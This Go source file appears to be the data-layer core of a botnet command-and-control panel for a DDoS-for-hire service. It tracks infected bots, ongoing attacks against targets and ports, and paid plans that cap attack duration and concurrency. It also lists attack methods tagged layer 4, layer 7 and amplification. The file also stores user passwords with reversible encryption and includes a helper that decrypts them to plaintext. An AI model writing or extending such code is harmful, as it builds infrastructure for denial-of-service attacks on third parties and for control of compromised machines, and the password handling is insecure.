package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

func init() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	os.Chdir(dir)
}

var (
	botConnections = &sync.Map{}
	ongoingAttacks = &sync.Map{}
	users          = &sync.Map{}
	plans          = &sync.Map{}
	methodList     = &sync.Map{}
	sessions       = &sync.Map{}
	mu             sync.Mutex
	dbPath         = "db"
)

type BotConnection struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	Arch     string    `json:"arch"`
	CPU      int       `json:"cpu"`
	Username string    `json:"username"`
	Online   bool      `json:"online"`
	LastSeen time.Time `json:"last_seen"`
}

type User struct {
	ID             string `json:"id"`
	Username       string `json:"username"`
	Email          string `json:"email"`
	Password       string `json:"password"`
	Rule           string `json:"rule"`
	Plan           string `json:"plan"`
	JoinDate       string `json:"join_date"`
	ExpirationDate string `json:"expiration_date"`
	MaxConcurrents int    `json:"max_concurrents"`
	MaxSeconds     int    `json:"max_seconds"`
	APIKey         string `json:"api_key"`
	AvatarURL      string `json:"avatar_url"`
}

type Plan struct {
	Name           string `json:"name"`
	MaxConcurrents int    `json:"max_concurrents"`
	MaxSeconds     int    `json:"max_seconds"`
	MinSeconds     int    `json:"min_seconds"`
	Premium        bool   `json:"premium"`
	APIAccess      bool   `json:"api_access"`
}

type Method struct {
	Method        string `json:"method"`
	Description   string `json:"description"`
	Layer4        bool   `json:"layer4"`
	Layer7        bool   `json:"layer7"`
	Amplification bool   `json:"amplification"`
	Premium       bool   `json:"premium"`
	Concurrents   int    `json:"concurrents"`
	Proxy         bool   `json:"proxy"`
}

type Proof struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	URL       string    `json:"url"`
	Caption   string    `json:"caption"`
	CreatedBy string    `json:"created_by"`
	CreatedAt time.Time `json:"created_at"`
}

type Attack struct {
	ID            string    `json:"attack_id"`
	Target        string    `json:"target"`
	Method        string    `json:"method"`
	Layer         string    `json:"layer"`
	TimeTotal     int       `json:"time_total"`
	TimeRemaining int       `json:"time_remaining"`
	Concurrents   int       `json:"concurrents"`
	Rpc           int       `json:"rpc"`
	Username      string    `json:"username"`
	StartTime     time.Time `json:"start_time"`
	Port          string    `json:"port"`
	Proxy         bool      `json:"proxy"`
}

func timeParse(s string) (time.Time, error) {
	return time.Parse(time.RFC3339, s)
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func generateToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func boolInt(b bool) int {
	if b { return 1 }
	return 0
}

func decryptPassword(stored string) string {
	if strings.HasPrefix(stored, "$2a$") || strings.HasPrefix(stored, "$2b$") {
		return "N/A (legacy hash)"
	}
	dec, err := decrypt(stored)
	if err != nil {
		return stored
	}
	return dec
}

func hashPassword(password string) string {
	enc, err := encrypt(password)
	if err != nil {
		return password
	}
	return enc
}

func checkPassword(password, stored string) bool {
	if strings.HasPrefix(stored, "$2a$") || strings.HasPrefix(stored, "$2b$") {
		err := bcrypt.CompareHashAndPassword([]byte(stored), []byte(password))
		return err == nil
	}
	dec, err := decrypt(stored)
	if err != nil {
		return false
	}
	return dec == password
}

func loadJSON(filename string, v interface{}) error {
	f, err := os.Open(filename)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	defer f.Close()
	return json.NewDecoder(f).Decode(v)
}

func loadData() {
	us, _ := storage.GetAllUsers()
	for _, u := range us {
		users.Store(u.Username, u)
	}
	ps, _ := storage.GetAllPlans()
	for _, p := range ps {
		plans.Store(p.Name, p)
	}
	ms, _ := storage.GetAllMethods()
	for _, m := range ms {
		methodList.Store(m.Method, m)
	}
	bs, _ := storage.GetAllBots()
	for _, b := range bs {
		botConnections.Store(b.ID, b)
	}
	as, _ := storage.GetAllOngoingAttacks()
	for _, a := range as {
		ongoingAttacks.Store(a.ID, a)
	}
}

func SaveUser(u User) {
	storage.SaveUser(u)
}

func SavePlan(p Plan) {
	storage.SavePlan(p)
}

func SaveMethod(m Method) {
	storage.SaveMethod(m)
}

func SaveOngoingAttack(a Attack) {
	storage.SaveOngoingAttack(a)
}

func SaveSessionToken(token, username string) {
	storage.SaveSession(token, username)
}

func getUserByUsername(username string) (User, bool) {
	v, ok := users.Load(username)
	if !ok {
		return User{}, false
	}
	return v.(User), true
}

func getUserByToken(token string) (User, bool) {
	username, ok := storage.GetSessionUsername(token)
	if !ok {
		return User{}, false
	}
	return getUserByUsername(username)
}

func deleteUser(username string) {
	storage.DeleteUser(username)
}

func deletePlan(name string) {
	storage.DeletePlan(name)
}

func deleteMethod(name string) {
	storage.DeleteMethod(name)
}

func deleteOngoingAttack(id string) {
	storage.DeleteOngoingAttack(id)
}

func getBotCount() int {
	count := 0
	botConnections.Range(func(_, _ interface{}) bool { count++; return true })
	return count
}

func getActiveAttackCount() int {
	count := 0
	ongoingAttacks.Range(func(_, v interface{}) bool {
		if a := v.(Attack); a.TimeRemaining > 0 {
			count++
		}
		return true
	})
	return count
}
